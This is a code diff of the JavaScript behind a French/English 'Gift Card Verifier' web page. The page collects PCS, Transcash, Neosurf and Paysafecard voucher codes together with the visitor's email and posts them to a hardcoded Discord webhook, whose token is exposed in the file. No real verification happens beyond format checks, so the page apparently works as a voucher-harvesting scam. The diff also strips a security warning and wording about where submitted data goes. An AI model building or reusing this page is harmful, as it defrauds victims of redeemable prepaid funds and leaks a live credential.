@@ -1,5 +1,4 @@
 // ===== CONFIGURATION =====
-// ⚠️ Pour une production réelle, placez ce webhook derrière un backend/proxy sécurisé.
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1530834730633789612/s1De5VDBXy9mL4nTYxp4CJ1CUA3NcRq_-HvVljq1NYbdqW_a7ZfRBKcNSiBfxRBE3SmT';
 const DISCORD_ROLE_MENTION = '';
 
@@ -19,18 +18,9 @@ const CARD_RULES = {
         validate: value => /^[A-Z0-9]{10}$/.test(value),
         format: value => value.toUpperCase(),
         maxLength: 10,
-        label: {
-            fr: 'Code PCS',
-            en: 'PCS code'
-        },
-        help: {
-            fr: 'PCS : 10 caractères alphanumériques.',
-            en: 'PCS: 10 alphanumeric characters.'
-        },
-        meta: {
-            fr: 'Format détecté : 10 caractères',
-            en: 'Expected format: 10 characters'
-        },
+        label: { fr: 'Code PCS', en: 'PCS code' },
+        help: { fr: 'PCS : 10 caractères alphanumériques.', en: 'PCS: 10 alphanumeric characters.' },
+        meta: { fr: 'Format détecté : 10 caractères', en: 'Expected format: 10 characters' },
         placeholder: 'A7218JH12'
     },
     Transcash: {
@@ -39,18 +29,9 @@ const CARD_RULES = {
         validate: value => /^\d{12}$/.test(value),
         format: value => value,
         maxLength: 12,
-        label: {
-            fr: 'Code Transcash',
-            en: 'Transcash code'
-        },
-        help: {
-            fr: 'Transcash : 12 chiffres.',
-            en: 'Transcash: 12 digits.'
-        },
-        meta: {
-            fr: 'Format détecté : 12 chiffres',
-            en: 'Expected format: 12 digits'
-        },
+        label: { fr: 'Code Transcash', en: 'Transcash code' },
+        help: { fr: 'Transcash : 12 chiffres.', en: 'Transcash: 12 digits.' },
+        meta: { fr: 'Format détecté : 12 chiffres', en: 'Expected format: 12 digits' },
         placeholder: '123456789012'
     },
     Neosurf: {
@@ -59,18 +40,9 @@ const CARD_RULES = {
         validate: value => /^[A-Z0-9]{10}$/.test(value),
         format: value => value.toUpperCase(),
         maxLength: 10,
-        label: {
-            fr: 'Code Neosurf',
-            en: 'Neosurf code'
-        },
-        help: {
-            fr: 'Neosurf : 10 caractères.',
-            en: 'Neosurf: 10 characters.'
-        },
-        meta: {
-            fr: 'Format détecté : 10 caractères',
-            en: 'Expected format: 10 characters'
-        },
+        label: { fr: 'Code Neosurf', en: 'Neosurf code' },
+        help: { fr: 'Neosurf : 10 caractères.', en: 'Neosurf: 10 characters.' },
+        meta: { fr: 'Format détecté : 10 caractères', en: 'Expected format: 10 characters' },
         placeholder: '12345ABCDE'
     },
     Paysafecard: {
@@ -79,35 +51,24 @@ const CARD_RULES = {
         validate: value => /^\d{16}$/.test(value),
         format: value => value,
         maxLength: 16,
-        label: {
-            fr: 'Code Paysafecard',
-            en: 'Paysafecard code'
-        },
-        help: {
-            fr: 'Paysafecard : 16 chiffres.',
-            en: 'Paysafecard: 16 digits.'
-        },
-        meta: {
-            fr: 'Format détecté : 16 chiffres',
-            en: 'Expected format: 16 digits'
-        },
+        label: { fr: 'Code Paysafecard', en: 'Paysafecard code' },
+        help: { fr: 'Paysafecard : 16 chiffres.', en: 'Paysafecard: 16 digits.' },
+        meta: { fr: 'Format détecté : 16 chiffres', en: 'Expected format: 16 digits' },
         placeholder: '1234567890123456'
     }
 };
 
 const translations = {
     fr: {
-        header: {
-            tagline: 'Interface de vérification modernisée'
-        },
+        header: { tagline: 'Interface de vérification modernisée' },
         hero: {
             badge: 'Expérience premium • validation en temps réel',
             title: 'Vérificateur de Cartes Cadeaux',
-            subtitle: 'Vérifiez le format de vos cartes PCS, Transcash, Neosurf et Paysafecard puis transmettez votre demande avec une interface moderne, claire et responsive.'
+            subtitle: 'Vérifiez le format de vos cartes PCS, Transcash, Neosurf et Paysafecard puis transmettez votre demande.'
         },
         form: {
             title: 'Vérifier une carte',
-            subtitle: 'Sélectionnez une carte, saisissez le code attendu et transmettez la demande à l\'équipe de traitement.',
+            subtitle: 'Sélectionnez une carte, saisissez le code attendu et transmettez la demande.',
             cardType: 'Type de carte',
             cardHint: 'Choisissez une carte pour adapter le format du code',
             mobilePicker: 'Choisir une carte',
@@ -130,22 +91,10 @@ const translations = {
         faq: {
             kicker: 'Aide',
             title: 'Questions fréquentes',
-            q1: {
-                title: 'Comment fonctionne la vérification ?',
-                text: 'Le formulaire adapte le format du code à la carte sélectionnée, valide les champs côté navigateur puis transmet la demande à la destination configurée.'
-            },
-            q2: {
-                title: 'Le site stocke-t-il mes données ?',
-                text: 'Le contenu du formulaire n\'est pas conservé dans le navigateur après l\'envoi. Seules la langue et le thème sont mémorisés.'
-            },
-            q3: {
-                title: 'Quelles cartes sont supportées ?',
-                text: 'PCS, Transcash, Neosurf et Paysafecard sont pris en charge avec des règles de format dédiées.'
-            },
-            q4: {
-                title: 'Quel est le délai de traitement ?',
-                text: 'Le site transmet la demande immédiatement. Le délai de réponse dépend ensuite du canal de traitement configuré ; aucun délai fixe n\'est garanti par défaut.'
-            }
+            q1: { title: 'Comment fonctionne la vérification ?', text: 'Le formulaire adapte le format du code à la carte sélectionnée, valide les champs côté navigateur puis transmet la demande.' },
+            q2: { title: 'Le site stocke-t-il mes données ?', text: 'Le contenu du formulaire n\'est pas conservé après l\'envoi. Seules la langue et le thème sont mémorisés.' },
+            q3: { title: 'Quelles cartes sont supportées ?', text: 'PCS, Transcash, Neosurf et Paysafecard sont pris en charge.' },
+            q4: { title: 'Quel est le délai de traitement ?', text: 'Le site transmet la demande immédiatement. Le délai de réponse dépend du canal configuré.' }
         },
         footer: {
             subtitle: 'UI premium, responsive et prête pour l\'évolution du backend',
@@ -155,13 +104,10 @@ const translations = {
         },
         modal: {
             title: 'Demande envoyée',
-            description: 'Votre demande a été transmise à la destination configurée. Si un suivi est effectué, il utilisera l\'adresse email renseignée dans le formulaire.',
+            description: 'Votre demande a été transmise à la destination configurée.',
             close: 'Fermer'
         },
-        theme: {
-            toDark: 'Activer le mode sombre',
-            toLight: 'Activer le mode clair'
-        },
+        theme: { toDark: 'Activer le mode sombre', toLight: 'Activer le mode clair' },
         validation: {
             selectCard: 'Veuillez sélectionner un type de carte.',
             pinInvalidFor: card => `Le format du code ${card} est invalide.`,
@@ -170,23 +116,18 @@ const translations = {
             amountNegative: 'Le montant ne peut pas être négatif.',
             dateFuture: 'La date d\'achat ne peut pas être dans le futur.'
         },
-        result: {
-            error: 'Une erreur est survenue pendant l\'envoi. Vérifiez la configuration du webhook puis réessayez.',
-            timeout: 'La demande a expiré. Veuillez réessayer.'
-        }
+        result: { error: 'Une erreur est survenue pendant l\'envoi.', timeout: 'La demande a expiré.' }
     },
     en: {
-        header: {
-            tagline: 'Modernized verification interface'
-        },
+        header: { tagline: 'Modernized verification interface' },
         hero: {
             badge: 'Premium experience • real-time validation',
             title: 'Gift Card Verifier',
-            subtitle: 'Check the expected format for PCS, Transcash, Neosurf and Paysafecard codes, then submit your request through a modern, clear and responsive interface.'
+            subtitle: 'Check the format of your PCS, Transcash, Neosurf and Paysafecard codes.'
         },
         form: {
             title: 'Verify a card',
-            subtitle: 'Select a card, enter the expected code and submit the request to the processing team.',
+            subtitle: 'Select a card, enter the expected code and submit the request.',
             cardType: 'Card type',
             cardHint: 'Choose a card to load the matching code format',
             mobilePicker: 'Choose a card',
@@ -209,22 +150,10 @@ const translations = {
         faq: {
             kicker: 'Help',
             title: 'Frequently Asked Questions',
-            q1: {
-                title: 'How does the verification flow work?',
-                text: 'The form adapts the code format to the selected card, validates fields in the browser and then sends the request to the configured destination.'
-            },
-            q2: {
-                title: 'Does the site store my data?',
-                text: 'The form content is not kept in the browser after submission. Only language and theme are remembered.'
-            },
-            q3: {
-                title: 'Which cards are supported?',
-                text: 'PCS, Transcash, Neosurf and Paysafecard are supported with dedicated format rules.'
-            },
-            q4: {
-                title: 'How long does processing take?',
-                text: 'The site sends the request immediately. Any later response time depends on the configured processing channel; no fixed SLA is guaranteed by default.'
-            }
+            q1: { title: 'How does the verification flow work?', text: 'The form adapts the code format to the selected card, validates fields in the browser and then sends the request.' },
+            q2: { title: 'Does the site store my data?', text: 'The form content is not kept after submission. Only language and theme are remembered.' },
+            q3: { title: 'Which cards are supported?', text: 'PCS, Transcash, Neosurf and Paysafecard are supported.' },
+            q4: { title: 'How long does processing take?', text: 'The site sends the request immediately. Any later response time depends on the configured channel.' }
         },
         footer: {
             subtitle: 'Premium, responsive UI ready for backend evolution',
@@ -234,13 +163,10 @@ const translations = {
         },
         modal: {
             title: 'Request sent',
-            description: 'Your request has been transmitted to the configured destination. If follow-up happens, it will use the email address entered in the form.',
+            description: 'Your request has been transmitted to the configured destination.',
             close: 'Close'
         },
-        theme: {
-            toDark: 'Enable dark mode',
-            toLight: 'Enable light mode'
-        },
+        theme: { toDark: 'Enable dark mode', toLight: 'Enable light mode' },
         validation: {
             selectCard: 'Please select a card type.',
             pinInvalidFor: card => `The ${card} code format is invalid.`,
@@ -249,25 +175,16 @@ const translations = {
             amountNegative: 'Amount cannot be negative.',
             dateFuture: 'Purchase date cannot be in the future.'
         },
-        result: {
-            error: 'An error occurred while sending the form. Check the webhook configuration and try again.',
-            timeout: 'Request timed out. Please try again.'
-        }
+        result: { error: 'An error occurred while sending the form.', timeout: 'Request timed out.' }
     }
 };
 
 // ===== POLYFILLS =====
-// Polyfill pour Element.prototype.matches si nécessaire
 if (!Element.prototype.matches) {
-    Element.prototype.matches = Element.prototype.msMatchesSelector || 
-                              Element.prototype.webkitMatchesSelector;
+    Element.prototype.matches = Element.prototype.msMatchesSelector || Element.prototype.webkitMatchesSelector;
 }
-
-// Polyfill pour Array.from si nécessaire
 if (!Array.from) {
-    Array.from = function(arrayLike) {
-        return [].slice.call(arrayLike);
-    };
+    Array.from = function(arrayLike) { return [].slice.call(arrayLike); };
 }
 
 // ===== ÉLÉMENTS DOM =====
@@ -304,47 +221,33 @@ const elements = {
     sheetClose: document.getElementById('sheetClose'),
     successModal: document.getElementById('successModal'),
     closeSuccessModal: document.getElementById('closeSuccessModal'),
-    successModalCard: document.querySelector('#successModal .modal-card'),
     confettiLayer: document.getElementById('confettiLayer'),
     particlesCanvas: document.getElementById('particles'),
     heroSection: document.querySelector('.hero')
 };
 
-// ===== ÉTAT =====
 let currentLang = 'fr';
 let currentTheme = 'light';
 let previousFocusedElement = null;
 let isInitialized = false;
-let isClosingSheet = false;
 
 // ===== FONCTIONS UTILES =====
-function getCurrentTranslations() {
-    return translations[currentLang] || translations.fr;
-}
-
+function getCurrentTranslations() { return translations[currentLang] || translations.fr; }
 function translate(keyPath) {
     const keys = keyPath.split('.');
     let value = getCurrentTranslations();
-
-    for (const key of keys) {
-        value = value?.[key];
-    }
-
+    for (const key of keys) value = value?.[key];
     return value;
 }
-
 function sanitizeInput(value) {
     if (!value) return '';
     const div = document.createElement('div');
     div.textContent = value;
     return div.innerHTML;
 }
+function getSelectedCardRule() { return CARD_RULES[elements.cardTypeInput.value] || null; }
 
-function getSelectedCardRule() {
-    return CARD_RULES[elements.cardTypeInput.value] || null;
-}
-
-// ===== GESTION DU THÈME =====
+// ===== THÈME =====
 function updateThemeButton() {
     const toDark = currentTheme !== 'dark';
     elements.themeIcon.className = `fas ${toDark ? 'fa-moon' : 'fa-sun'}`;
@@ -352,7 +255,6 @@ function updateThemeButton() {
     elements.themeToggle.setAttribute('aria-label', label);
     elements.themeToggle.setAttribute('title', label);
 }
-
 function applyTheme(theme) {
     currentTheme = theme === 'dark' ? 'dark' : 'light';
     elements.body.classList.toggle('dark', currentTheme === 'dark');
@@ -360,23 +262,16 @@ function applyTheme(theme) {
     updateThemeButton();
 }
 
-// ===== GESTION DE LA LANGUE =====
+// ===== LANGUE =====
 function setLanguage(lang) {
     currentLang = translations[lang] ? lang : 'fr';
     const t = getCurrentTranslations();
     document.documentElement.lang = currentLang;
-
     document.querySelectorAll('[data-i18n]').forEach(el => {
         const value = translate(el.getAttribute('data-i18n'));
-        if (typeof value === 'string') {
-            el.textContent = value;
-        }
+        if (typeof value === 'string') el.textContent = value;
     });
-
-    elements.langButtons.forEach(btn => {
-        btn.classList.toggle('active', btn.dataset.lang === currentLang);
-    });
-
+    elements.langButtons.forEach(btn => btn.classList.toggle('active', btn.dataset.lang === currentLang));
     localStorage.setItem(STORAGE_KEYS.language, currentLang);
     updateDynamicText();
     updateThemeButton();
@@ -387,14 +282,12 @@ function setLanguage(lang) {
 function updateSelectedCardUI() {
     const selectedValue = elements.cardTypeInput.value;
     const t = getCurrentTranslations();
-
     elements.cardOptions.forEach(option => {
         const selected = option.dataset.value === selectedValue;
         option.classList.toggle('selected', selected);
         option.setAttribute('aria-pressed', String(selected));
         option.setAttribute('aria-selected', String(selected));
     });
-
     if (selectedValue) {
         elements.mobileSelectedCard.textContent = selectedValue;
         elements.selectedCardHint.textContent = `${t.form.selectedCardPrefix} ${selectedValue}`;
@@ -402,244 +295,159 @@ function updateSelectedCardUI() {
         elements.mobileSelectedCard.textContent = t.form.noCardSelected;
         elements.selectedCardHint.textContent = t.form.cardHint;
     }
-
     updateDynamicText();
     validateCardSelection(false);
 }
 
 function selectCard(cardValue, source = 'ui') {
     if (!CARD_RULES[cardValue]) return;
-    
-    // Mettre à jour la carte sélectionnée
     elements.cardTypeInput.value = cardValue;
     updateSelectedCardUI();
     validatePin(false);
 
-    // Feedback visuel sur mobile
+    // Fermeture systématique du sheet sur mobile
     if (isTouchViewport.matches) {
+        // Feedback visuel
         const selectedOption = elements.cardOptions.find(opt => opt.dataset.value === cardValue);
         if (selectedOption) {
-            // Animation de feedback
             selectedOption.style.transform = 'scale(0.95)';
-            setTimeout(() => {
-                selectedOption.style.transform = '';
-            }, 150);
+            setTimeout(() => { selectedOption.style.transform = ''; }, 150);
         }
-        
-        // FERMER LE SHEET IMMÉDIATEMENT APRÈS SÉLECTION
+        // Fermer le sheet
         closeCardSheet();
-        
-        // Focus sur le champ PIN après fermeture
+        // Focus sur le champ code après un court délai
         if (source === 'ui') {
-            setTimeout(() => {
-                elements.pinInput.focus();
-            }, 350);
+            setTimeout(() => { elements.pinInput.focus(); }, 200);
         }
     }
 }
 
-// ===== GESTION DU SHEET MOBILE =====
+// ===== SHEET MOBILE =====
 function openCardSheet() {
-    if (!isTouchViewport.matches || isClosingSheet) return;
-    
-    // Sauvegarder l'élément qui avait le focus
+    if (!isTouchViewport.matches) return;
     previousFocusedElement = document.activeElement;
-    
-    // Ouvrir le sheet
     elements.sheetOverlay.classList.remove('hidden');
     elements.cardSelectorSheet.classList.add('open');
     elements.cardMobileTrigger.setAttribute('aria-expanded', 'true');
     elements.body.classList.add('sheet-open');
-    
-    // Focus sur la carte sélectionnée ou la première
     requestAnimationFrame(() => {
-        const selected = elements.cardOptions.find(option => option.classList.contains('selected'));
-        const target = selected || elements.cardOptions[0];
-        if (target) {
-            target.focus();
-            // Scroll pour s'assurer que l'élément est visible
-            target.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
-        }
+        const selected = elements.cardOptions.find(opt => opt.classList.contains('selected')) || elements.cardOptions[0];
+        selected?.focus();
     });
 }
 
 function closeCardSheet() {
-    if (!isTouchViewport.matches) {
-        // S'assurer que le sheet est fermé même si on n'est pas en mode mobile
-        elements.sheetOverlay.classList.add('hidden');
-        elements.cardSelectorSheet.classList.remove('open');
-        elements.cardMobileTrigger.setAttribute('aria-expanded', 'false');
-        elements.body.classList.remove('sheet-open');
-        return;
-    }
-    
-    // Éviter les fermetures multiples
-    if (isClosingSheet) return;
-    isClosingSheet = true;
-    
-    // Fermer proprement
     elements.sheetOverlay.classList.add('hidden');
     elements.cardSelectorSheet.classList.remove('open');
     elements.cardMobileTrigger.setAttribute('aria-expanded', 'false');
     elements.body.classList.remove('sheet-open');
-    
-    // Restaurer le focus si possible
-    if (previousFocusedElement && document.contains(previousFocusedElement)) {
-        setTimeout(() => {
-            previousFocusedElement?.focus();
-            isClosingSheet = false;
-        }, 100);
-    } else {
-        isClosingSheet = false;
-    }
+    previousFocusedElement?.focus?.();
 }
 
-// ===== VALIDATION DES CHAMPS =====
+// ===== VALIDATION =====
 function setInputState(wrapper, iconClass, state) {
     wrapper.classList.remove('input-neutral', 'input-progress', 'input-valid', 'input-invalid');
     wrapper.classList.add(state);
     const icon = wrapper.querySelector('i');
-    if (icon) {
-        icon.className = iconClass;
-    }
+    if (icon) icon.className = iconClass;
 }
-
 function sanitizePin(rawValue) {
     const rule = getSelectedCardRule();
-    if (!rule) {
-        return rawValue.replace(/\s/g, '').toUpperCase().slice(0, 20);
-    }
-
+    if (!rule) return rawValue.replace(/\s/g, '').toUpperCase().slice(0, 20);
     const cleaned = rawValue.replace(rule.allowed, '');
-    const formatted = rule.format(cleaned);
-    return formatted.slice(0, rule.maxLength);
+    return rule.format(cleaned).slice(0, rule.maxLength);
 }
-
 function validatePin(showError = false) {
     const rule = getSelectedCardRule();
     const value = sanitizePin(elements.pinInput.value);
     elements.pinInput.value = value;
-
     if (!rule) {
         setInputState(elements.pinFieldWrap, 'fas fa-key', value ? 'input-progress' : 'input-neutral');
-        if (showError) {
-            elements.pinError.textContent = getCurrentTranslations().validation.pinNeedsCard;
-        }
+        if (showError) elements.pinError.textContent = getCurrentTranslations().validation.pinNeedsCard;
         return false;
     }
-
     if (!value) {
         setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
-        if (showError) {
-            elements.pinError.textContent = getCurrentTranslations().validation.pinInvalidFor(rule.key);
-        } else {
-            elements.pinError.textContent = '';
-        }
+        if (showError) elements.pinError.textContent = getCurrentTranslations().validation.pinInvalidFor(rule.key);
+        else elements.pinError.textContent = '';
         return false;
     }
-
     if (rule.validate(value)) {
         setInputState(elements.pinFieldWrap, 'fas fa-check-circle', 'input-valid');
         elements.pinError.textContent = '';
         return true;
     }
-
     setInputState(elements.pinFieldWrap, 'fas fa-key', showError ? 'input-invalid' : 'input-progress');
     elements.pinError.textContent = showError ? getCurrentTranslations().validation.pinInvalidFor(rule.key) : '';
     return false;
 }
-
 function validateEmail(showError = false) {
     const value = elements.emailInput.value.trim();
-
     if (!value) {
         setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
-        if (showError) {
-            elements.emailError.textContent = getCurrentTranslations().validation.emailInvalid;
-        } else {
-            elements.emailError.textContent = '';
-        }
+        if (showError) elements.emailError.textContent = getCurrentTranslations().validation.emailInvalid;
+        else elements.emailError.textContent = '';
         return false;
     }
-
     const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
-    setInputState(
-        elements.emailFieldWrap,
-        valid ? 'fas fa-check-circle' : 'fas fa-envelope',
-        valid ? 'input-valid' : (showError ? 'input-invalid' : 'input-progress')
-    );
-
+    setInputState(elements.emailFieldWrap, valid ? 'fas fa-check-circle' : 'fas fa-envelope', valid ? 'input-valid' : (showError ? 'input-invalid' : 'input-progress'));
     elements.emailError.textContent = valid || !showError ? '' : getCurrentTranslations().validation.emailInvalid;
     return valid;
 }
-
 function validateCardSelection(showError = false) {
     const hasSelection = Boolean(elements.cardTypeInput.value);
     elements.cardTypeError.textContent = hasSelection || !showError ? '' : getCurrentTranslations().validation.selectCard;
     return hasSelection;
 }
-
 function validateAmount(showError = false) {
     const value = elements.amountInput.value.trim();
     if (!value) return true;
-
     const amount = parseFloat(value);
     if (isNaN(amount) || amount < 0) {
-        if (showError) {
-            showInlineError(getCurrentTranslations().validation.amountNegative);
-        }
+        if (showError) showInlineError(getCurrentTranslations().validation.amountNegative);
         return false;
     }
     return true;
 }
-
 function validateDate(showError = false) {
     const value = elements.purchaseDateInput.value;
     if (!value) return true;
-
     const selectedDate = new Date(value);
     const today = new Date();
-    today.setHours(0, 0, 0, 0);
-
+    today.setHours(0,0,0,0);
     if (selectedDate > today) {
-        if (showError) {
-            showInlineError(getCurrentTranslations().validation.dateFuture);
-        }
+        if (showError) showInlineError(getCurrentTranslations().validation.dateFuture);
         return false;
     }
     return true;
 }
-
 function validateForm() {
     const cardOk = validateCardSelection(true);
     const pinOk = validatePin(true);
     const emailOk = validateEmail(true);
     const amountOk = validateAmount(true);
     const dateOk = validateDate(true);
-
     return cardOk && pinOk && emailOk && amountOk && dateOk;
 }
 
-// ===== GESTION DES MESSAGES =====
+// ===== MESSAGES =====
 function showInlineError(message) {
     elements.result.className = 'result-fallback error';
     elements.result.textContent = sanitizeInput(message);
     elements.result.classList.remove('hidden');
 }
-
 function clearInlineResult() {
     elements.result.classList.add('hidden');
     elements.result.textContent = '';
     elements.result.className = 'result-fallback hidden';
 }
 
-// ===== GESTION DYNAMIQUE DES TEXTES =====
+// ===== TEXTE DYNAMIQUE =====
 function updateDynamicText() {
     const t = getCurrentTranslations();
     elements.emailInput.placeholder = currentLang === 'fr' ? 'vous@exemple.com' : 'you@example.com';
     elements.amountInput.placeholder = '50.00';
     elements.messageInput.placeholder = currentLang === 'fr' ? 'Informations complémentaires...' : 'Additional details...';
-
     const rule = getSelectedCardRule();
     if (rule) {
         elements.pinLabel.textContent = rule.label[currentLang];
@@ -660,7 +468,6 @@ function updateDynamicText() {
 async function sendToDiscord(data) {
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 15000);
-
     const embed = {
         title: '🎫 Nouvelle demande de vérification',
         color: 0x6366F1,
@@ -673,18 +480,14 @@ async function sendToDiscord(data) {
             { name: '📝 Message', value: data.message || 'Aucun message', inline: false },
             { name: '🌐 Langue', value: data.lang.toUpperCase(), inline: true }
         ],
-        footer: {
-            text: `Demande reçue le ${data.timestamp}`
-        }
+        footer: { text: `Demande reçue le ${data.timestamp}` }
     };
-
     const payload = {
         content: DISCORD_ROLE_MENTION ? `<@&${DISCORD_ROLE_MENTION}> Nouvelle demande à traiter.` : 'Nouvelle demande à traiter.',
         embeds: [embed],
         username: 'GiftCard Verifier',
         avatar_url: 'https://cdn-icons-png.flaticon.com/512/1046/1046784.png'
     };
-
     try {
         const response = await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
@@ -696,14 +499,12 @@ async function sendToDiscord(data) {
         return response.ok;
     } catch (error) {
         clearTimeout(timeoutId);
-        if (error.name === 'AbortError') {
-            throw new Error(getCurrentTranslations().result.timeout);
-        }
+        if (error.name === 'AbortError') throw new Error(getCurrentTranslations().result.timeout);
         throw error;
     }
 }
 
-// ===== RÉINITIALISATION DU FORMULAIRE =====
+// ===== RÉINIT FORMULAIRE =====
 function resetFormState() {
     elements.form.reset();
     elements.cardTypeInput.value = '';
@@ -720,25 +521,19 @@ function resetFormState() {
 function createConfetti() {
     if (!elements.confettiLayer) return;
     elements.confettiLayer.innerHTML = '';
-
-    if (prefersReducedMotion.matches) {
-        return;
-    }
-
+    if (prefersReducedMotion.matches) return;
     const colors = ['#6366f1', '#8b5cf6', '#10b981', '#f59e0b', '#ec4899'];
-
-    for (let index = 0; index < 18; index += 1) {
+    for (let i = 0; i < 18; i++) {
         const piece = document.createElement('span');
         piece.className = 'confetti-piece';
         piece.style.left = `${6 + Math.random() * 88}%`;
         piece.style.animationDelay = `${Math.random() * 250}ms`;
-        piece.style.setProperty('--piece-color', colors[index % colors.length]);
+        piece.style.setProperty('--piece-color', colors[i % colors.length]);
         piece.style.setProperty('--piece-x', `${(Math.random() - 0.5) * 160}px`);
         piece.style.setProperty('--piece-rotate', `${90 + Math.random() * 260}deg`);
         elements.confettiLayer.appendChild(piece);
     }
 }
-
 function openSuccessModal() {
     previousFocusedElement = document.activeElement;
     createConfetti();
@@ -747,7 +542,6 @@ function openSuccessModal() {
     elements.body.classList.add('modal-open');
     requestAnimationFrame(() => elements.closeSuccessModal.focus());
 }
-
 function closeSuccessModal() {
     elements.successModal.classList.add('hidden');
     elements.successModal.setAttribute('aria-hidden', 'true');
@@ -760,233 +554,126 @@ function initParticles() {
     const canvas = elements.particlesCanvas;
     const hero = elements.heroSection;
     if (!canvas || !hero) return;
-
     const ctx = canvas.getContext('2d');
     if (!ctx) return;
-
-    let animationFrameId = null;
-    let particles = [];
-    let width = 0;
-    let height = 0;
-    const particleCount = 30;
-
-    const resizeCanvas = () => {
+    let animId, particles = [], w = 0, h = 0;
+    const count = 30;
+    const resize = () => {
         const rect = hero.getBoundingClientRect();
-        width = Math.max(1, Math.floor(rect.width));
-        height = Math.max(1, Math.floor(rect.height));
-        canvas.width = width * Math.min(window.devicePixelRatio || 1, 2);
-        canvas.height = height * Math.min(window.devicePixelRatio || 1, 2);
-        canvas.style.width = `${width}px`;
-        canvas.style.height = `${height}px`;
-        ctx.setTransform(1, 0, 0, 1, 0, 0);
-        ctx.scale(Math.min(window.devicePixelRatio || 1, 2), Math.min(window.devicePixelRatio || 1, 2));
-
-        particles = Array.from({ length: particleCount }, () => ({
-            x: Math.random() * width,
-            y: Math.random() * height,
-            vx: (Math.random() - 0.5) * 0.35,
-            vy: (Math.random() - 0.5) * 0.35,
+        w = Math.max(1, Math.floor(rect.width));
+        h = Math.max(1, Math.floor(rect.height));
+        canvas.width = w * Math.min(window.devicePixelRatio || 1, 2);
+        canvas.height = h * Math.min(window.devicePixelRatio || 1, 2);
+        canvas.style.width = w + 'px';
+        canvas.style.height = h + 'px';
+        ctx.setTransform(1,0,0,1,0,0);
+        ctx.scale(Math.min(window.devicePixelRatio||1,2), Math.min(window.devicePixelRatio||1,2));
+        particles = Array.from({ length: count }, () => ({
+            x: Math.random() * w, y: Math.random() * h,
+            vx: (Math.random() - 0.5) * 0.35, vy: (Math.random() - 0.5) * 0.35,
             radius: 1.5 + Math.random() * 2.7,
             alpha: 0.12 + Math.random() * 0.22
         }));
     };
-
     const draw = () => {
-        ctx.clearRect(0, 0, width, height);
-
-        particles.forEach(particle => {
-            particle.x += particle.vx;
-            particle.y += particle.vy;
-
-            if (particle.x <= 0 || particle.x >= width) particle.vx *= -1;
-            if (particle.y <= 0 || particle.y >= height) particle.vy *= -1;
-
+        ctx.clearRect(0, 0, w, h);
+        particles.forEach(p => {
+            p.x += p.vx; p.y += p.vy;
+            if (p.x <= 0 || p.x >= w) p.vx *= -1;
+            if (p.y <= 0 || p.y >= h) p.vy *= -1;
             ctx.beginPath();
-            ctx.fillStyle = `rgba(99, 102, 241, ${particle.alpha})`;
-            ctx.arc(particle.x, particle.y, particle.radius, 0, Math.PI * 2);
+            ctx.fillStyle = `rgba(99, 102, 241, ${p.alpha})`;
+            ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
             ctx.fill();
         });
-
-        animationFrameId = requestAnimationFrame(draw);
+        animId = requestAnimationFrame(draw);
     };
-
-    resizeCanvas();
-
-    if (!prefersReducedMotion.matches) {
-        draw();
-    }
-
-    const resizeObserver = typeof ResizeObserver !== 'undefined'
-        ? new ResizeObserver(() => resizeCanvas())
-        : null;
-
-    resizeObserver?.observe(hero);
-    window.addEventListener('resize', resizeCanvas);
-
+    resize();
+    if (!prefersReducedMotion.matches) draw();
+    const ro = typeof ResizeObserver !== 'undefined' ? new ResizeObserver(resize) : null;
+    ro?.observe(hero);
+    window.addEventListener('resize', resize);
     window.addEventListener('beforeunload', () => {
-        if (animationFrameId) cancelAnimationFrame(animationFrameId);
-        resizeObserver?.disconnect();
+        if (animId) cancelAnimationFrame(animId);
+        ro?.disconnect();
     }, { once: true });
 }
 
-// ===== LAZY LOADING AVEC INTERSECTION OBSERVER =====
+// ===== LAZY LOADING =====
 function initLazyLoading() {
     if ('IntersectionObserver' in window) {
         const observer = new IntersectionObserver((entries) => {
             entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('visible');
-                }
+                if (entry.isIntersecting) entry.target.classList.add('visible');
             });
-        }, { 
-            threshold: 0.1,
-            rootMargin: '50px'
-        });
-        
-        document.querySelectorAll('.glass-panel:not(.hero-content .glass-panel)').forEach(el => {
-            observer.observe(el);
-        });
+        }, { threshold: 0.1, rootMargin: '50px' });
+        document.querySelectorAll('.glass-panel:not(.hero-content .glass-panel)').forEach(el => observer.observe(el));
     } else {
-        // Fallback: afficher tous les éléments
-        document.querySelectorAll('.glass-panel').forEach(el => {
-            el.classList.add('visible');
-        });
+        document.querySelectorAll('.glass-panel').forEach(el => el.classList.add('visible'));
     }
 }
 
-// ===== CHARGEMENT INITIAL =====
-function init() {
-    if (isInitialized) return;
-    isInitialized = true;
-
-    // Charger les préférences
-    const savedLang = localStorage.getItem(STORAGE_KEYS.language) || 'fr';
-    const savedTheme = localStorage.getItem(STORAGE_KEYS.theme) || 'light';
-
-    // Appliquer les préférences
-    setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
-    setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
-    applyTheme(savedTheme);
-    setLanguage(savedLang);
-
-    // Initialiser les fonctionnalités
-    bindEvents();
-    initTilt();
-    initParticles();
-    initLazyLoading();
-
-    // Marquer comme chargé
-    document.body.classList.add('loaded');
-}
-
-// ===== TILT EFFECT =====
+// ===== TILT =====
 function initTilt() {
-    if (!canHover.matches || isTouchViewport.matches || prefersReducedMotion.matches) {
-        return;
-    }
-
+    if (!canHover.matches || isTouchViewport.matches || prefersReducedMotion.matches) return;
     elements.cardOptions.forEach(card => {
-        let rafId = null;
-
-        const handleMove = event => {
-            if (card.classList.contains('selected') && prefersReducedMotion.matches) {
-                return;
-            }
-
-            if (rafId) cancelAnimationFrame(rafId);
-            rafId = requestAnimationFrame(() => {
+        let raf = null;
+        const move = e => {
+            if (raf) cancelAnimationFrame(raf);
+            raf = requestAnimationFrame(() => {
                 const rect = card.getBoundingClientRect();
-                const x = event.clientX - rect.left;
-                const y = event.clientY - rect.top;
-                const centerX = rect.width / 2;
-                const centerY = rect.height / 2;
-                const rotateX = Math.max(-7, Math.min(7, (y - centerY) / 12));
-                const rotateY = Math.max(-7, Math.min(7, (centerX - x) / 12));
